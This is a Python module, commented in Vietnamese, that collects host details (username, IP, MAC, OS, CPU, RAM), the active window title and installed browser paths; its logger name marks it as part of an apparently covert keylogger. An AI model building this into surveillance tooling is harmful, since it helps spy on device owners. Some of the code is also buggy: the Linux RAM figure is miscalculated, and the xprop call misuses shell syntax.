#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module thu thập thông tin hệ thống
"""

import os
import re
import uuid
import socket
import platform
import logging
import subprocess
from typing import Dict, Optional

class SystemInfo:
    """Class chứa các phương thức tĩnh để lấy thông tin hệ thống."""
    
    logger = logging.getLogger("keylogger.system_info")
    
    @staticmethod
    def get_system_info() -> Dict[str, str]:
        """Lấy thông tin hệ thống máy tính.
        
        Returns:
            Dict[str, str]: Từ điển chứa thông tin hệ thống
        """
        info = {}
        try:
            # Tên máy tính
            info["device_name"] = socket.gethostname()
            
            # Tên người dùng
            info["username"] = os.getlogin()
            
            # Địa chỉ IP
            try:
                # Cố gắng lấy địa chỉ IP công khai
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info["ip_address"] = s.getsockname()[0]
                s.close()
            except Exception as e:
                SystemInfo.logger.warning(f"Không thể lấy IP công khai: {e}")
                info["ip_address"] = socket.gethostbyname(socket.gethostname())
            
            # Địa chỉ MAC
            info["mac_address"] = ":".join(re.findall("..", "%012x" % uuid.getnode()))
            
            # Thông tin hệ điều hành
            info["os_info"] = f"{platform.system()} {platform.release()} {platform.version()}"
            
            # Thông tin phần cứng (CPU, RAM...)
            try:
                info["cpu_info"] = SystemInfo.get_cpu_info()
                info["ram_info"] = SystemInfo.get_ram_info()
            except Exception as e:
                SystemInfo.logger.warning(f"Không thể lấy thông tin phần cứng: {e}")
        
        except Exception as e:
            SystemInfo.logger.error(f"Lỗi khi lấy thông tin hệ thống: {e}")
            # Đảm bảo tất cả các key đều có giá trị
            for key in ["device_name", "username", "ip_address", "mac_address", "os_info"]:
                if key not in info:
                    info[key] = "Unknown"
        
        return info
    
    @staticmethod
    def get_active_window_title() -> str:
        """Lấy tiêu đề cửa sổ đang hoạt động.
        
        Returns:
            str: Tiêu đề cửa sổ hiện tại
        """
        try:
            system = platform.system()
            
            if system == "Windows":
                try:
                    import win32gui
                    
                    hwnd = win32gui.GetForegroundWindow()
                    return win32gui.GetWindowText(hwnd) or "Unknown Window"
                except ImportError:
                    SystemInfo.logger.warning("Không thể import win32gui, sử dụng phương pháp thay thế")
                    try:
                        # Phương pháp thay thế sử dụng PowerShell
                        cmd = 'powershell "Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object -ExpandProperty MainWindowTitle"'
                        output = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore').strip()
                        return output.split('\n')[0] if output else "Unknown Window"
                    except Exception:
                        return "Unknown Window"
            
            elif system == "Darwin":  # macOS
                script = '''
                tell application "System Events"
                    set frontApp to name of first application process whose frontmost is true
                end tell
                '''
                try:
                    output = subprocess.check_output(["osascript", "-e", script], stderr=subprocess.DEVNULL)
                    return output.decode().strip() or "Unknown Window"
                except Exception:
                    return "Unknown Window"
            
            elif system == "Linux":
                # Thử một số công cụ phổ biến trên Linux
                for cmd in (
                    ["xdotool", "getwindowfocus", "getwindowname"],
                    ["xprop", "-id", "$(xprop -root _NET_ACTIVE_WINDOW | cut -d' ' -f5)", "_NET_WM_NAME"],
                ):
                    try:
                        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
                        if b"_NET_WM_NAME" in output:  # xprop output
                            return output.decode().split('"', 1)[1].rsplit('"', 1)[0]
                        return output.decode().strip() or "Unknown Window"
                    except Exception:
                        continue
            
            return "Unknown Window"
        
        except Exception as e:
            SystemInfo.logger.error(f"Lỗi khi lấy tiêu đề cửa sổ: {e}")
            return "Unknown Window"
    
    @staticmethod
    def get_cpu_info() -> str:
        """Lấy thông tin về CPU.
        
        Returns:
            str: Thông tin CPU
        """
        try:
            system = platform.system()
            
            if system == "Windows":
                try:
                    cmd = 'wmic cpu get name'
                    output = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore').strip()
                    lines = output.split('\n')
                    if len(lines) >= 2:
                        return lines[1].strip()
                except Exception:
                    pass
            
            elif system == "Darwin":  # macOS
                try:
                    cmd = "sysctl -n machdep.cpu.brand_string"
                    return subprocess.check_output(cmd, shell=True).decode().strip()
                except Exception:
                    pass
            
            elif system == "Linux":
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        for line in f:
                            if line.startswith('model name'):
                                return line.split(':', 1)[1].strip()
                except Exception:
                    pass
            
            # Fallback to platform module
            return platform.processor() or "Unknown CPU"
        
        except Exception as e:
            SystemInfo.logger.error(f"Lỗi khi lấy thông tin CPU: {e}")
            return "Unknown CPU"
    
    @staticmethod
    def get_ram_info() -> str:
        """Lấy thông tin về RAM.
        
        Returns:
            str: Thông tin RAM (tổng dung lượng)
        """
        try:
            system = platform.system()
            
            if system == "Windows":
                try:
                    cmd = 'wmic ComputerSystem get TotalPhysicalMemory'
                    output = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore').strip()
                    lines = output.split('\n')
                    if len(lines) >= 2:
                        total_bytes = int(lines[1].strip())
                        return f"{total_bytes / (1024**3):.2f} GB"
                except Exception:
                    pass
            
            elif system == "Darwin":  # macOS
                try:
                    cmd = "sysctl -n hw.memsize"
                    total_bytes = int(subprocess.check_output(cmd, shell=True).decode().strip())
                    return f"{total_bytes / (1024**3):.2f} GB"
                except Exception:
                    pass
            
            elif system == "Linux":
                try:
                    with open('/proc/meminfo', 'r') as f:
                        for line in f:
                            if line.startswith('MemTotal'):
                                # Format: "MemTotal:       16426476 kB"
                                kb = int(line.split()[1])
                                return f"{kb / (1024**1):.2f} GB"
                except Exception:
                    pass
            
            return "Unknown RAM"
        
        except Exception as e:
            SystemInfo.logger.error(f"Lỗi khi lấy thông tin RAM: {e}")
            return "Unknown RAM"
    
    @staticmethod
    def get_installed_browsers() -> Dict[str, str]:
        """Lấy danh sách các trình duyệt đã cài đặt.
        
        Returns:
            Dict[str, str]: Từ điển {tên_trình_duyệt: đường_dẫn}
        """
        browsers = {}
        system = platform.system()
        
        try:
            if system == "Windows":
                # Các đường dẫn phổ biến trên Windows
                common_paths = {
                    "Chrome": [
                        os.path.join(os.environ.get('PROGRAMFILES', ''), "Google", "Chrome", "Application", "chrome.exe"),
                        os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Google", "Chrome", "Application", "chrome.exe")
                    ],
                    "Firefox": [
                        os.path.join(os.environ.get('PROGRAMFILES', ''), "Mozilla Firefox", "firefox.exe"),
                        os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Mozilla Firefox", "firefox.exe")
                    ],
                    "Edge": [
                        os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Microsoft", "Edge", "Application", "msedge.exe"),
                        os.path.join(os.environ.get('PROGRAMFILES', ''), "Microsoft", "Edge", "Application", "msedge.exe")
                    ],
                    "Opera": [
                        os.path.join(os.environ.get('PROGRAMFILES', ''), "Opera", "launcher.exe"),
                        os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "Opera", "launcher.exe")
                    ],
                    "Brave": [
                        os.path.join(os.environ.get('PROGRAMFILES', ''), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
                        os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), "BraveSoftware", "Brave-Browser", "Application", "brave.exe")
                    ]
                }
                
                for browser, paths in common_paths.items():
                    for path in paths:
                        if os.path.exists(path):
                            browsers[browser] = path
                            break
            
            elif system == "Darwin":  # macOS
                # Các ứng dụng phổ biến trên macOS
                common_paths = {
                    "Chrome": "/Applications/Google Chrome.app",
                    "Firefox": "/Applications/Firefox.app",
                    "Safari": "/Applications/Safari.app",
                    "Edge": "/Applications/Microsoft Edge.app",
                    "Opera": "/Applications/Opera.app",
                    "Brave": "/Applications/Brave Browser.app"
                }
                
                for browser, path in common_paths.items():
                    if os.path.exists(path):
                        browsers[browser] = path
            
            elif system == "Linux":
                # Kiểm tra các lệnh phổ biến trên Linux
                common_browsers = {
                    "Chrome": "google-chrome",
                    "Chromium": "chromium-browser",
                    "Firefox": "firefox",
                    "Opera": "opera",
                    "Brave": "brave-browser",
                    "Edge": "microsoft-edge"
                }
                
                for browser, cmd in common_browsers.items():
                    try:
                        path = subprocess.check_output(["which", cmd], stderr=subprocess.DEVNULL).decode().strip()
                        if path:
                            browsers[browser] = path
                    except Exception:
                        pass
        
        except Exception as e:
            SystemInfo.logger.error(f"Lỗi khi lấy danh sách trình duyệt: {e}")
        
        return browsers